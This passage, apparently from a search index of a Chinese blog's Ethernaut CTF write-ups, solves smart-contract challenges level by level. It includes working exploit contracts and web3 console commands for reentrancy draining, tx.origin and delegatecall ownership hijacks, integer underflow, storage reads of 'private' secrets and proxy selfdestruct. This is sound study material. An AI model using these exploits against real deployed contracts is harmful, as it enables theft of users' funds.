\u4e00\u4e2a\u90e8\u7f72\u7684\u65b0\u5408\u7ea6\uff0c\u8ba9\u5b83\u89e6\u53d1 selfdestruct \u5c31\u597d\u4e86 \u65b0\u5408\u7ea6\uff1a // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { function exp () public { selfdestruct ( payable ( 0 )); } } \u653b\u51fb\u6d41\u7a0b\uff1a > await web3 . eth . getStorageAt ( instance , \"0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc\" ) '0x000000000000000000000000<engine address>' > engine = \"0x<engine address>\" > data = web3 . utils . sha3 ( \"initialize()\" ). slice ( 0 , 10 ) '0x8129fc1c' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data }) > await web3 . eth . call ({ from : player , to : engine , data : web3 . utils . sha3 ( \"upgrader()\" ). slice ( 0 , 10 )}) // \u9a8c\u8bc1 upgrader '0x000000000000000000000000<player address>' > exp = \"<Exploit contract address>\" > expdata = web3 . utils . sha3 ( \"exp()\" ). slice ( 0 , 10 ) '0xab60ffda' > signature = { name : 'upgradeToAndCall' , type : 'function' , inputs : [ { type : 'address' , name : 'newImplementation' }, { type : 'bytes memory' , name : 'data' } ] } { name : 'upgradeToAndCall' , type : 'function' , inputs : Array ( 2 )} > data = web3 . eth . abi . encodeFunctionCall ( upgradeSignature , [ exp , expdata ]) '0x4f1ef286000000000000000000000000700f6c75bffc3e6379bfa14cf050127c15a5573900000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004ab60ffda00000000000000000000000000000000000000000000000000000000' > web3 . eth . sendTransaction ({ from : player , to : engine , data : data })","title":"Ethernaut"},{"location":"writeups/ethernaut/#ethernaut-writeups","text":"Abstract https://ethernaut.openzeppelin.com/ \u4e0a\u7684\u4e00\u7cfb\u5217\u4ee5\u592a\u574a\u667a\u80fd\u5408\u7ea6\u7c7b\u9898\u76ee\uff0c\u5165\u95e8 blockchain \u7684\u65f6\u5019\u505a\u7684\uff0c\u8fd9\u91cc\u8bb0\u4e0b\u505a\u9898\u8bb0\u5f55 \u524d\u7f6e\u6b65\u9aa4\uff1a \u5b89\u88c5 MetaMask \u6d4f\u89c8\u5668\u63d2\u4ef6\uff0c\u5e76\u521b\u5efa\u65b0\u8d26\u6237 \u8fde\u63a5\u5230 Rinkeby \u6d4b\u8bd5\u7f51\u7edc \u901a\u8fc7 https://faucet.rinkeby.io/ \u6216\u8005 https://faucets.chain.link/rinkeby \u641e\u70b9\u6d4b\u8bd5\u5e01\uff08\u4e3b\u8981\u7528\u6765\u540e\u7eed\u652f\u4ed8 gas\uff09 \u5728 ethernaut \u4e0a\u8fde\u63a5 MetaMask \u6bcf\u4e00\u9053\u9898\u76ee\u5148\u751f\u6210\u65b0\u5b9e\u4f8b\uff0c\u5728 console \u4e2d\u5b8c\u6210\u540e\u63d0\u4ea4\u5b9e\u4f8b","title":"Ethernaut Writeups"},{"location":"writeups/ethernaut/#hello-ethernaut","text":"\u6309\u7167\u9898\u76ee\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u8c03\u7528\u51fd\u6570\u5373\u53ef","title":"Hello Ethernaut"},{"location":"writeups/ethernaut/#fallback","text":"\u7ed9\u4e86\u5408\u7ea6\u6e90\u7801 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Fallback { using SafeMath for uint256 ; mapping ( address => uint ) public contributions ; address payable public owner ; constructor () public { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { owner . transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u76ee\u6807\u662f\u62ff\u5230\u8fd9\u4e2a\u5408\u7ea6\u7684\u63a7\u5236\u6743\uff0c\u8f6c\u51fa\u6240\u6709\u4f59\u989d \u4e3b\u8981\u903b\u8f91\u662f contribute \u51fd\u6570\u4f1a\u589e\u52a0\u8c03\u7528\u8005\u7684 contributions\uff0c\u5f53\u5927\u4e8e 1000 ether \u7684\u65f6\u5019\uff0c\u4f1a\u628a\u6240\u6709\u6743\u8f6c\u7ed9\u73a9\u5bb6\u3002\u901a\u8fc7\u8fd9\u4e2a\u6765\u83b7\u5f97\u63a7\u5236\u6743\u662f\u4e0d\u73b0\u5b9e\u7684 \u800c\u53e6\u4e00\u4e2a\u4f1a\u53d1\u751f\u6240\u6709\u6743\u8f6c\u6362\u7684\u51fd\u6570\u662f receive \u51fd\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a fallback \u51fd\u6570\uff0c\u4f1a\u5728\u5408\u7ea6\u8d26\u6237\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u65f6\u5019\u89e6\u53d1\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u8981\u5411\u5408\u7ea6\u53d1\u51fa\u5e26\u6709\u4ee5\u592a\u5e01\u7684\u4ea4\u6613\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\u8f6c\u79fb\u6240\u6709\u6743 \u800c\u4e4b\u524d\u8fd8\u9700\u8981\u5148\u4fdd\u8bc1 contributions \u5927\u4e8e 0\uff0c\u6240\u4ee5\u89e3\u6cd5\uff1a > contract . contribute ({ value : 1 }) // \u4f7f contributions \u5927\u4e8e 0 > contract . sendTransaction ({ value : 1 }) // \u89e6\u53d1 fallback \u8f6c\u79fb\u6240\u6709\u6743 > contract . withdraw () // \u8f6c\u51fa\u6240\u6709\u4f59\u989d","title":"Fallback"},{"location":"writeups/ethernaut/#fallout","text":"\u8981\u6c42\u5f97\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743 \u6839\u636e\u5408\u7ea6\u6e90\u7801\u53ef\u4ee5\u53d1\u73b0\u5b83\u7684 constructor \u7684\u51fd\u6570\u540d\u4e3a Fal1out\uff0c\u5e76\u4e0d\u662f\u5408\u7ea6\u540d Fallout\uff0c\u6709 l1 \u7684\u5dee\u522b \u6240\u4ee5\u76f4\u63a5\u8c03\u7528 contract.Fal1out() \u5c31\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u5408\u7ea6\u6240\u6709\u6743","title":"Fallout"},{"location":"writeups/ethernaut/#coin-flip","text":"\u9898\u76ee\u5408\u7ea6 pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract CoinFlip { using SafeMath for uint256 ; uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () public { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number . sub ( 1 ))); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8981\u6c42\u8fde\u7eed\u731c\u5bf9\u5341\u6b21\uff0c\u5408\u7ea6\u4e2d\u7ed9\u51fa\u4e86\u5b83\u53d6\u968f\u673a\u6570\u7684\u65b9\u5f0f\uff0c\u5373\u5c06 block.number \u51cf\u4e00\uff0c\u53d6\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u518d\u9664\u4ee5 FACTOR \u5224\u65ad\u662f\u5426\u4e3a 1 \u6240\u4ee5\u5199\u4e00\u4e2a\u65b0\u5408\u7ea6\u6765\u83b7\u53d6\u540c\u6837\u7684 block.number \u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b54\u6848 \u56e0\u4e3a\u5224\u65ad\u4e86 lashHash == blockValue \u7684\u65f6\u5019 revert\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\uff0c\u9010\u6b21\u731c\u6d4b\uff0c\u8fde\u7eed\u731c 10 \u6b21 exp // SPDX-License-Identifier: GPL-3.0 pragma solidity ^ 0.6.0 ; /* code of CoinFlip */ contract Exploit { using SafeMath for uint256 ; CoinFlip p ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor ( address challenge ) public { p = CoinFlip ( challenge ); } function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number . sub ( 1 ))); uint256 coinFlip = blockValue . div ( FACTOR ); bool side = coinFlip == 1 ? true : false ; p . flip ( side ); } }","title":"Coin Flip"},{"location":"writeups/ethernaut/#telephone","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Telephone { address public owner ; constructor () public { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u4e5f\u662f\u9700\u8981\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u800c\u8c03\u7528\u5408\u7ea6\u4e2d\u7684 changeOwner \u51fd\u6570\u6765\u8f6c\u79fb\u6240\u6709\u6743\u7684\u8bdd\uff0c\u9700\u8981\u4f7f tx.origin \u548c msg.sender \u4e0d\u540c \u5b83\u4eec\u7684\u533a\u522b\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u6240\u4ee5\u5982\u679c\u901a\u8fc7 \u8d26\u6237 A -> \u5408\u7ea6 A -> \u5408\u7ea6 B \u6765\u8c03\u7528\u7684\u8bdd\uff0ctx.origin \u5c31\u662f\u8d26\u6237 A\uff0c\u800c\u5bf9\u4e8e\u5408\u7ea6 B \u6765\u8bf4\uff0cmsg.sender \u662f\u5408\u7ea6 A \u6240\u4ee5\u8fd9\u9898\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u6765\u8c03\u7528\u9898\u76ee\u7684 changeOwner \u51fd\u6570\u5c31\u597d\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Telephone */ contract Exploit { Telephone p = Telephone ( < instance address > ); function exp () public { p . changeOwner ( msg.sender ); } }","title":"Telephone"},{"location":"writeups/ethernaut/#token","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u5f00\u5c40\u81ea\u5df1\u7684 balance \u662f 20\uff0c\u76ee\u7684\u662f\u589e\u52a0\u81ea\u5df1\u7684 balance \u53ef\u4ee5\u53d1\u73b0 transfer \u4e2d\u662f\u76f4\u63a5\u5c06 sender \u7684 balance \u51cf\u8f6c\u8d26\u7684 value\uff0c\u800c\u5982\u679c value \u8d85\u8fc7 balance \u5219\u4f1a\u53d1\u751f\u6ea2\u51fa\uff0c\u56e0\u4e3a\u662f uint\uff0c\u5219\u4f1a\u53d8\u4e3a\u5f88\u5927\u7684\u503c \u6240\u4ee5\u901a\u8fc7 await contract . transfer ( < any address > , 21 ) \u5373\u53ef\u4f7f\u81ea\u5df1\u7684 balance \u6ea2\u51fa\u53d8\u5927","title":"Token"},{"location":"writeups/ethernaut/#delegation","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Delegate { address public owner ; constructor ( address _owner ) public { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) public { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u76ee\u7684\u8fd8\u662f\u62ff\u5230\u6240\u6709\u6743\uff0c\u5373\u6267\u884c Delegate \u4e2d\u7684 pwn \u51fd\u6570 \u53ef\u4ee5\u901a\u8fc7\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528 delegatecall \u6765\u901a\u8fc7 msg.data \u8c03\u7528 pwn \u51fd\u6570 data \u4e2d\u524d\u56db\u4e2a\u5b57\u8282\u662f\u8981\u8c03\u7528\u7684\u51fd\u6570\u524d\u9762\u7684 sha3 \u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u540e\u9762\u5982\u679c\u6ca1\u6709\u4f20\u5165\u6570\u636e\u53ef\u4ee5\u7701\u7565 \u6240\u4ee5\u8ba1\u7b97\u51fa pwn() \u7684 sha3 \u7136\u540e\u4f5c\u4e3a data \u4f20\u7ed9 fallback \u5373\u53ef > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" })","title":"Delegation"},{"location":"writeups/ethernaut/#force","text":"\u9898\u76ee\u662f\u4e00\u4e2a\u7a7a\u7684\u5408\u7ea6\uff0c\u8981\u6c42\u5411\u5176\u4e2d\u8f6c\u8d26 \u800c\u4e00\u4e2a\u5408\u7ea6\u5728\u81ea\u6bc1\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5c06\u4f59\u989d\u5168\u90e8\u5f3a\u5236\u8f6c\u5230\u53e6\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u6240\u4ee5\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\u7136\u540e\u81ea\u6bc1\uff0c\u628a\u4f59\u989d\u8f6c\u5230\u5b9e\u4f8b\u5730\u5740\u4e0a\u5c31\u53ef\u4ee5\u4e86 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } }","title":"Force"},{"location":"writeups/ethernaut/#vault","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u8981 unlock \u8fd9\u4e2a\u5408\u7ea6\u8d26\u6237\uff0c\u4e5f\u5c31\u662f\u8981\u627e\u5230 password \u867d\u7136 password \u88ab\u8bbe\u4e3a\u4e86 private\uff0c\u4f46\u662f\u5728\u533a\u5757\u4e2d\u7684\u6570\u636e\u4ecd\u7136\u662f\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u53ea\u8981 getStorageAt \u5c31\u53ef\u4ee5\u4e86\uff1a > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb","title":"Vault"},{"location":"writeups/ethernaut/#king","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5f53\u9898\u76ee\u518d\u6b21\u51fa\u8d44\u66f4\u9ad8\u7684\u65f6\u5019\uff0cking \u5c31\u4f1a\u56de\u5230\u9898\u76ee\u4e0a\uff0c\u8981\u4fdd\u6301 king \u5728\u81ea\u5df1\u8eab\u4e0a \u800c\u6bcf\u6b21\u66f4\u6362 king \u7684\u65f6\u5019\u90fd\u4f1a\u5148\u628a\u91d1\u989d transfer \u7ed9\u4e0a\u4e00\u4e2a king\uff0c\u6240\u4ee5\u53ea\u8981\u4e0d\u63a5\u6536\u5c31\u597d\u4e86 \u53ef\u4ee5\u4f7f\u7528 fallback\uff0c\u7136\u540e\u51fd\u6570\u91cc\u9762\u76f4\u63a5 revert // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call . gas ( 10000000 ). value ( msg.value )( \"\" ); } fallback () external { revert (); } } \u6ce8\u610f\u9700\u8981\u652f\u4ed8\u5927\u4e8e 1 ether \u624d\u53ef\u4ee5\u5148\u62ff\u5230 king","title":"King"},{"location":"writeups/ethernaut/#re-entrancy","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f msg . sender . call { value : _amount }( \"\" ) \uff0c\u5e76\u4e14\u5728\u8fd9\u4e4b\u540e\u624d\u51cf\u5c11 balances \u800c\u8fd9\u4e2a call \u4f1a\u6389\u5230 fallback \u4e2d\uff0c\u5982\u679c fallback \u91cc\u518d\u6b21\u8c03\u7528\u4e86 withdraw \u5c31\u5b9e\u73b0\u4e86\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u65ad\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u7684\u4f59\u989d\u76f4\u5230\u4e3a 0 \u5148\u901a\u8fc7 await getBalance ( instance ) \u5f97\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\u7684 balance \u4e3a 0.001 ether\uff0c\u6240\u4ee5\u6bcf\u6b21 withdraw 0.001 ether \u5c31\u597d exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u9996\u5148\u76f4\u63a5\u90e8\u7f72\u5408\u7ea6\uff0c\u7136\u540e contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )}) \u5148 donate 0.001 ether\uff0c\u7136\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\u63d0\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4f59\u989d","title":"Re-entrancy"},{"location":"writeups/ethernaut/#elevator","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u76ee\u7684\u662f\u4f7f\u7535\u68af\u8fbe\u5230\u6700\u9876\u5c42\uff0c\u5373\u4f7f\u9898\u76ee\u5408\u7ea6\u7684 top \u4e3a true \u56e0\u4e3a top \u7684\u53d8\u5316\u53ea\u4f1a\u5728 goTo \u91cc\u53d1\u751f\u53d8\u5316\uff0c\u5e76\u4e14\u53ea\u6709\u5728 isLastFloor \u4e3a false \u7684\u65f6\u5019\u624d\u4f1a\u6539 top\uff0c\u800c\u4e14\u4e24\u6b21\u8c03\u7528 isLastFloor \u7684\u8f93\u5165\u4e00\u6837 \u6240\u4ee5\u53ea\u9700\u8981\u8ba9\u7b2c\u4e00\u6b21\u8c03\u7528 isLastFloor \u8fd4\u56de false\uff0c\u7b2c\u4e8c\u6b21\u8fd4\u56de true \u5c31\u53ef\u4ee5\u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } } \u8fd9\u6837\u5728\u90e8\u7f72\u4e4b\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u8ba9 top \u4e3a true","title":"Elevator"},{"location":"writeups/ethernaut/#privacy","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Privacy { bool public locked = true ; uint256 public ID = block.timestamp ; uint8 private flattening = 10 ; uint8 private denomination = 255 ; uint16 private awkwardness = uint16 ( now ); bytes32 [ 3 ] private data ; constructor ( bytes32 [ 3 ] memory _data ) public { data = _data ; } function unlock ( bytes16 _key ) public { require ( _key == bytes16 ( data [ 2 ])); locked = false ; } } \u548c Vault \u90a3\u9898\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u8981\u8bfb\u53d6 private \u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 unlock \u540c\u6837\u6765\u7528 web3 . eth . getStorageAt \u6765 dump \u51fa storage\uff1a > await web3 . eth . getStorageAt ( instance , 0 ) '0x0000000000000000000000000000000000000000000000000000000000000001' > await web3 . eth . getStorageAt ( instance , 1 ) '0x00000000000000000000000000000000000000000000000000000000623b0e73' > await web3 . eth . getStorageAt ( instance , 2 ) '0x000000000000000000000000000000000000000000000000000000000e73ff0a' > await web3 . eth . getStorageAt ( instance , 3 ) '0x3c991a198af652eb94710764c3f0401f1120427381fa7c46eeb6231cde2c9569' > await web3 . eth . getStorageAt ( instance , 4 ) '0xa792357f9443825334e26c299815fc6253b294b4a9155f49ea735bd2631dc364' > await web3 . eth . getStorageAt ( instance , 5 ) '0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf' > await web3 . eth . getStorageAt ( instance , 6 ) '0x0000000000000000000000000000000000000000000000000000000000000000' \u4e0d\u96be\u770b\u51fa 0 \u5904\u5b58\u50a8\u7684\u662f bool locked\uff0c1 \u5904\u662f\u4e00\u4e2a 256 \u4f4d ID\uff0c2 \u5904\u662f\u5269\u4e0b\u7684\u4e24\u4e2a uint8\u3001\u4e00\u4e2a uint16 \u62fc\u51fa\u6765\u7684\uff0c\u800c 3\uff5e5 \u5c31\u662f data \u4e86 \u6240\u4ee5 data[2] \u4e5f\u5c31\u662f 0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf \u800c unlock \u9700\u8981 bytes16\uff0c\u800c\u4e14\u5728\u5185\u90e8\u5c06 data[2] \u5f3a\u5236\u8f6c\u6362\u4e3a\u4e86 bytes16\uff0c\u8fd9\u4f1a\u53d6\u524d 16 \u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u8c03\u7528 unlock: contract . unlock ( \"0x6710884543189de73f0dfb9d36a99f2a\" )","title":"Privacy"},{"location":"writeups/ethernaut/#gatekeeper-one","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract GatekeeperOne { using SafeMath for uint256 ; address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { require ( gasleft (). mod ( 8191 ) == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); require ( uint32 ( uint64 ( _gateKey )) == uint16 ( tx.origin ), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx.origin ; return true ; } } \u76ee\u6807\u662f\u901a\u8fc7\u4e09\u4e2a modifier \u7684\u68c0\u6d4b\uff0c\u5373\u6709\u4e09\u4e2a\u8981\u6c42 msg.sender != tx.origin\uff1a\u5373\u901a\u8fc7\u4e00\u4e2a\u5408\u7ea6\u6765\u95f4\u63a5\u8c03\u7528 enter gasleft() % 8191 == 0\uff1a\u8fd0\u884c\u5230\u8fd9\u4e00\u6b65\u65f6\u5269\u4f59\u7684 gas \u8981\u662f 8191 \u7684\u500d\u6570 \u8f93\u5165\u7684 _gateKey \u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6 \u7b2c\u4e00\u4e2a\u597d\u529e\uff0c\u76f4\u63a5\u5199\u4e00\u4e2a\u5408\u7ea6\u5c31\u597d \u7b2c\u4e8c\u4e2a\u56e0\u4e3a\u8fc7\u7a0b\u4e2d\u4f1a\u6d88\u8017\u591a\u5c11 gas \u4e0d\u660e\u786e\uff0c\u6240\u4ee5\u8981\u5148\u5199\u4e00\u4e2a\u8bd5\u8bd5\u6765 debug\uff0c\u770b\u770b\u4e2d\u9014\u6d88\u8017\u4e86\u591a\u5c11 gas\uff1a contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 81910 )( bytes8 ( \"0x123456\" )); } } \u5148\u968f\u610f\u8bbe\u7f6e gas \u4e3a 81910\uff0c\u7136\u540e\u90e8\u7f72\u5408\u7ea6\u3001\u8c03\u7528\uff0cdebug\uff08\u9700\u8981\u8c03\u5230 JavaScript VM \u4e0a\uff0c\u4f7f\u7528 Inject \u7684 Rinkeby \u7f51\u7edc\u597d\u50cf\u6ca1\u6cd5\u8c03\u8bd5\uff09 \u5355\u6b65\u8fd0\u884c\uff0c\u76f4\u5230\u6d41\u7a0b\u8fdb\u5165\u5230 gateTwo \u51fd\u6570\u4e2d\u7684 GAS \u6307\u4ee4\uff08\u5c06\u5269\u4f59\u7684 gas \u538b\u5165\u6808\u4e2d\uff09\uff0c\u6b64\u65f6\u663e\u793a\u5f53\u524d\u6b65 gas \u4e3a 2\uff0c\u5269\u4f59 gas \u4e3a 81658 \u6240\u4ee5\u8f93\u5165\u7684 gas \u4e3a 81910 + (81910 - 81658) + 2 = 82164 \u65f6\uff0c\u538b\u5165\u6808\u4e2d\u7684 gas \u521a\u597d\u662f 81910 \u5bf9\u4e8e\u7b2c\u4e09\u4e2a\uff0cbytes8 \u76f8\u5f53\u4e8e uint64\uff0c\u800c\u4e14\u4f7f\u7528 uintx \u6765\u5f3a\u5236\u8f6c\u6362\u65f6\u4ece\u540e\u5f80\u524d\u53d6\uff0c\u6240\u4ee5\u9700\u8981\u6ee1\u8db3\uff1a 16~31 \u4f4d\uff08\u540e 3\u30014 \u5b57\u8282\uff09\u4e3a 0 32 \u4f4d\u53ca\u4ee5\u4e0a\u4e0d\u5168\u4e3a 0 0~15 \u4f4d\uff08\u540e\u4e24\u4e2a\u5b57\u8282\uff09\u548c\u81ea\u5df1\u5730\u5740\u7684\u540e\u4e24\u4e2a\u5b57\u8282\u76f8\u540c \u6240\u4ee5\u53ef\u4ee5\u6784\u9020\u51fa\u9700\u8981\u7684 bytes8 \u4e3a bytes8 ( 0x0000000100000E28 ) \uff0c\u628a\u8fd9\u4e2a\u8f93\u5165\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e09\u4e2a gate \u4e86 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Exploit { GatekeeperOne challenge ; constructor ( address addr ) public { challenge = GatekeeperOne ( addr ); } function exp () public { challenge . enter . gas ( 82164 )( bytes8 ( 0x0000000100000E28 )); } }","title":"Gatekeeper One"},{"location":"writeups/ethernaut/#gatekeeper-two","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg.sender != tx.origin ); _ ; } modifier gateTwo () { uint x ; assembly { x : = extcodesize ( caller ()) } require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 